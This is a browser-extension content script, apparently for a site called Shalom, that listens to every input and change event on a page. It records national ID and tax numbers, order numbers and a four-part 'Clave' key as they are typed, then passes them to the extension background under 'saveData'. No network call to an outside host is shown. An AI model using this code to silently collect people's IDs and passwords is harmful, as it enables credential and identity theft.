(() => {
const CONTENT_STATE_KEY = '__shalomRecordarContentState__';
const DOC_INPUT_ID = 'inputnombre';
const OS_INPUT_ID = 'inputnroguia';
const CLAVE_FIELDS = ['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'];
const DEDUPE_WINDOW_MS = 1500;

function getContentState() {
    const globalState = globalThis[CONTENT_STATE_KEY] || {};
    globalThis[CONTENT_STATE_KEY] = globalState;
    return globalState;
}

function normalizeText(rawValue) {
    return String(rawValue ?? '').trim();
}

function normalizeDigits(rawValue) {
    return normalizeText(rawValue).replace(/\s+/g, '');
}

function classifyDocumentValue(rawValue) {
    const value = normalizeDigits(rawValue);

    if (!/^\d+$/.test(value)) {
        return null;
    }

    if (value.length === 8) return { field: 'DNI', value };
    if (value.length === 9) return { field: 'CE', value };
    if (value.length === 11) return { field: 'RUC', value };
    return null;
}

function getInputSource(target) {
    const raw = String(target?.id || target?.name || target?.placeholder || target?.getAttribute?.('aria-label') || target?.tagName || 'sin_nombre');
    return raw.trim();
}

function getInputId(target) {
    return getInputSource(target).toLowerCase();
}

function getFieldValue(target) {
    if (!target) return '';
    if (typeof target.value === 'string') return target.value;
    if (typeof target.textContent === 'string') return target.textContent;
    return '';
}

function isCaptureTarget(target) {
    return Boolean(target) && (target.nodeType === 1 || typeof target.value === 'string' || typeof target.textContent === 'string');
}

function isClaveField(target) {
    return CLAVE_FIELDS.includes(getInputId(target));
}

function isOsField(target) {
    return getInputId(target) === OS_INPUT_ID;
}

function isDocumentField(target) {
    return getInputId(target) === DOC_INPUT_ID;
}

function isRelevantField(target) {
    return isClaveField(target) || isOsField(target) || isDocumentField(target);
}

function shouldCapture(event) {
    return Boolean(event)
        && !event.defaultPrevented
        && !event.isComposing
        && (event.type === 'input' || event.type === 'change');
}

function canSendCapture(state, dedupeKey, eventTimeStamp) {
    const now = typeof eventTimeStamp === 'number' && Number.isFinite(eventTimeStamp) ? eventTimeStamp : Date.now();
    const previous = state.lastCaptureByKey?.[dedupeKey];
    if (previous && now - previous < DEDUPE_WINDOW_MS) {
        return false;
    }

    state.lastCaptureByKey ||= {};
    state.lastCaptureByKey[dedupeKey] = now;
    return true;
}

function sendCapture(field, value, source, eventTimeStamp) {
    const state = getContentState();
    const dedupeKey = [source, field, value].join('|');
    if (!canSendCapture(state, dedupeKey, eventTimeStamp)) {
        return;
    }

    chrome.runtime.sendMessage({
        action: 'saveData',
        data: {
            captureId: [source, field, value, String(eventTimeStamp ?? Date.now())].join('|'),
            field,
            value,
            source,
            timestamp: new Date().toISOString(),
        },
    });
}

function captureDocument(target, source, eventTimeStamp) {
    const classified = classifyDocumentValue(getFieldValue(target));
    if (!classified) return;
    sendCapture(classified.field, classified.value, source, eventTimeStamp);
}

function captureOs(target, source, eventTimeStamp) {
    const value = normalizeText(getFieldValue(target));
    if (!/^\d+$/.test(value)) return;
    sendCapture('OS', value, source, eventTimeStamp);
}

function captureClave(target, source, eventTimeStamp) {
    const value = normalizeText(getFieldValue(target));
    if (!value) return;

    const visibleFields = CLAVE_FIELDS
        .map((fieldId) => document.getElementById(fieldId))
        .filter(Boolean);
    const claveCompleta = visibleFields.length > 0
        ? visibleFields.map((field) => normalizeText(getFieldValue(field))).join('')
        : value;

    if (!claveCompleta) return;
    sendCapture('Clave', claveCompleta, source, eventTimeStamp);
}

function handleCapture(event) {
    if (!shouldCapture(event)) return;

    const target = event.target;
    if (!isCaptureTarget(target)) return;

    const source = getInputSource(target);
    if (!isRelevantField(target)) return;

    if (isOsField(target)) {
        captureOs(target, source, event.timeStamp);
        return;
    }

    if (isClaveField(target)) {
        captureClave(target, source, event.timeStamp);
        return;
    }

    if (isDocumentField(target)) {
        captureDocument(target, source, event.timeStamp);
    }
}

function ensureDocumentListener() {
    const state = getContentState();
    if (state.documentListenerAttached) return;
    state.documentListenerAttached = true;
    document.addEventListener('input', handleCapture, true);
    document.addEventListener('change', handleCapture, true);
}

function ensureMutationObserver() {
    const state = getContentState();
    if (state.captureObserverAttached || typeof MutationObserver === 'undefined') return;

    const root = document.documentElement || document.body;
    if (!root) return;

    state.captureObserverAttached = true;
    const observer = new MutationObserver(() => {
        ensureDocumentListener();
    });

    observer.observe(root, { childList: true, subtree: true });
    state.captureObserver = observer;
}

ensureDocumentListener();
ensureMutationObserver();
})();
